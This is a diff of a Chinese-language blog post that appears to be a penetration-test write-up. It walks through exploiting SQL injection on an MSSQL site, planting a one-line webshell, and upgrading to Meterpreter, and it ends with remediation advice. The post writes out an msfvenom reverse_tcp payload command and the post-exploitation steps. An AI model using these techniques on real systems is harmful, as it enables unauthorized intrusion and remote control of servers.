@@ -75,32 +75,35 @@
 <p>结果还真的报错了 SQL注入 稳稳的了</p>
 <p><img src="/uploads/2019/11/20/5.png" alt></p>
 <p>这时候，我的SQLMAP已经按捺不住了 测试存在SQL注入漏洞 是MSSQL数据库</p>
+<p>我来康康是不是DBA权限</p>
 <p><img src="/uploads/2019/11/20/6.png" alt></p>
+<p>结果真的让我喜出望外 拿下shell的节奏啊</p>
+<p><img src="/uploads/2019/11/20/7.png" alt></p>
 <p>一看权限 好低 唉 先拿个shell再说吧</p>
 <p>我决定用绝对路径写shell的方式写入一个一句话木马</p>
 <p>那么就需要知道物理路径 没有怎么办？让页面报错，IIS就会显示路径 嗯 不错🤨</p>
-<p><img src="/uploads/2019/11/20/7.png" alt></p>
-<p>好 现在已经知道了物理路径了 接下来 开始写shell</p>
 <p><img src="/uploads/2019/11/20/8.png" alt></p>
-<p>写入成功了 打开页面也没问题 接下来用我的大天使之剑(蚁剑)连接一句话木马</p>
+<p>好 现在已经知道了物理路径了 接下来 开始写shell</p>
 <p><img src="/uploads/2019/11/20/9.png" alt></p>
-<p>成功拿到shell 但是权限太低 没啥卵用</p>
+<p>写入成功了 打开页面也没问题 接下来用我的大天使之剑(蚁剑)连接一句话木马</p>
 <p><img src="/uploads/2019/11/20/10.png" alt></p>
-<p>查看了一下进程 居然没有杀毒软件和任何WAF 直接用MSF上线吧</p>
+<p>成功拿到shell 但是权限太低 没啥卵用</p>
 <p><img src="/uploads/2019/11/20/11.png" alt></p>
+<p>查看了一下进程 居然没有杀毒软件和任何WAF 直接用MSF上线吧</p>
+<p><img src="/uploads/2019/11/20/12.png" alt></p>
 <p>先用MSF生成一个windows的64位的木马，具体位数得看操作系统，这个服务器的位数是64位</p>
 <p>命令 <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.xx.xx.xxx LPORT=5555 -f exe &gt; a.exe</code> 即可生成64位木马，32位木马不加 <code>x64</code> 就ok了</p>
-<p><img src="/uploads/2019/11/20/12.png" alt></p>
-<p>然后再开个MSF去监听 具体的设置看图就ok了</p>
 <p><img src="/uploads/2019/11/20/13.png" alt></p>
-<p>把木马放到 <code>Student</code> 这个目录，貌似只有这个目录可写可读可执行，我也太惨了。。。</p>
+<p>然后再开个MSF去监听 具体的设置看图就ok了</p>
 <p><img src="/uploads/2019/11/20/14.png" alt></p>
+<p>把木马放到 <code>Student</code> 这个目录，貌似只有这个目录可写可读可执行，我也太惨了。。。</p>
+<p><img src="/uploads/2019/11/20/15.png" alt></p>
 <p>使用大天使之剑(蚁剑)终端执行这个文件居然没有上线。。。</p>
 <p>我懵逼了 可能是蚁剑的问题吧 我还是换个一句话木马连接工具吧</p>
-<p><img src="/uploads/2019/11/20/15.png" alt></p>
+<p><img src="/uploads/2019/11/20/16.png" alt></p>
 <p>好了 换了一个一句话木马工具执行之后 成功上线了 注意 我是在内网 嘻嘻 不需要做任何的内网穿透啊 啥的</p>
 <p>上线都上线了 接下来当然要提权了 使用MSF的漏洞补丁扫描模块命令 <code>run post/windows/gather/enum_patches</code></p>
-<p><img src="/uploads/2019/11/20/16.png" alt></p>
+<p><img src="/uploads/2019/11/20/17.png" alt></p>
 <p>结果 我都试过了 一个都不行 我太惨了 窃取Token令牌的方法 由于没有高权限用户的进程 所以没法弄 提权我没法了 有大佬知道怎么提权 教教我 我太菜了</p>
 <h2 id="漏洞修复建议"><a href="#漏洞修复建议" class="headerlink" title="漏洞修复建议"></a>漏洞修复建议</h2><ol>
 <li><p>前端或者后端严格对用户输入字符进行过滤</p>
